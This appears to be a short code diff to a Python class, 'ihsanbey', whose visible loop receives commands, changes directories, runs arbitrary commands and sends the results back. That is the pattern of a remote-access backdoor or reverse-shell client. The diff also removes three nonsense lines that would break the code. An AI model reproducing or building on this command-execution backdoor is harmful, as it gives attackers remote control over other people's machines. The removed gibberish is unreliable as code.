@@ -57,9 +57,6 @@ class ihsanbey:
                 path = command.split(" ")[1] 
                 command_result =  self.change_dir(path)
                 self.reliable_send(command_result)
-                beyler zippidi zpiidi 
-                for i in path :
-                     lapsğdlpqğw 
             else:
                 try:    
                     resultt = self.execute_command(command.encode("utf-8"))
